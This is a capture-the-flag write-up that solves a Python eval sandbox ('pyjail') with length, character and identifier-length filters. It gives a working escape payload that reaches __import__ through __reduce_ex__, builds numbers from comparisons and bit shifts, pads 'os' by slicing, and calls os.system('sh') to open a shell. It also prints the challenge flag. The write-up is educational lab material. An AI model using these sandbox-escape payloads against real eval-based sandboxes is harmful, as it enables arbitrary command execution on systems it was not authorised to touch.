## decreasing  

<img src="images/chall.png" width=600>

We are given a pretty small pyjail with some restrictions.  
- payload must be `123` character or under
- cannot contain `+-*/=`
- every identifier (`a-zA-Z0-9_`) must be shorter than the preceeding one
- `__builtins__` set to empty dictionary `{}`

```python
code = input("code> ")[:100 + 20 + 3]

if not code.isascii():
    print("bye")
    exit(1)

# i hate math
if any(c in code for c in '+-*/='):
    print("bye")
    exit(1)

min_len = 1337
for m in __import__("re").finditer(r"\w+", code):
    if len(m[0]) >= min_len:
        print("bye")
        exit(1)
    min_len = len(m[0])

eval(code, {"__builtins__": {}})
```

Our basic payload will achieve RCE using an attribute chain on a tuple `()`.  

Because of the length limit, we can use the `__reduce_ex__` chain, as opposed to the conventional `__class__.__base__.__subclasses__()` chain.  

```python
().__reduce_ex__(2)[0].__builtins__['__import__']('os').system('sh')
```

Now, we need to bypass the identifier length checks. `2` and `0` are currently being detected as identifiers, and this will cause our payload to fail the check since they are both only `1` character long.  

To fix this, we can get creative and build these numbers using comparisons and bitshifts on non-alphanumeric characters, which will exclude them from the identifier checks.  

```python
('('>'')<<('('>'')  # 1 << 1 -> 2
()<()               # False  -> 0
```

At this point, all the identifiers are in descending length order, except for `os`.  

`__import__` is `10` characters long and ``system` is `6` characters long, so we just need to find a way to pad `os` to `7` characters.  

To do this, we can pad the `os` string, then use string slicing to extract the first `2` characters using the bitshift technique from earlier.  

```python
'os00000'[:('('>'')<<('('>'')]
```

This gives us the final payload, which will allow us to pop a shell and find the flag file in root.  

```python
().__reduce_ex__(('('>'')<<('('>''))[()<()].__builtins__['__import__']('os00000'[:('('>'')<<('('>'')]).system('sh')
```

<img src="images/flag.png" width=600>

Flag: `gigem{c0un7d0wn_t0_th3_flag}`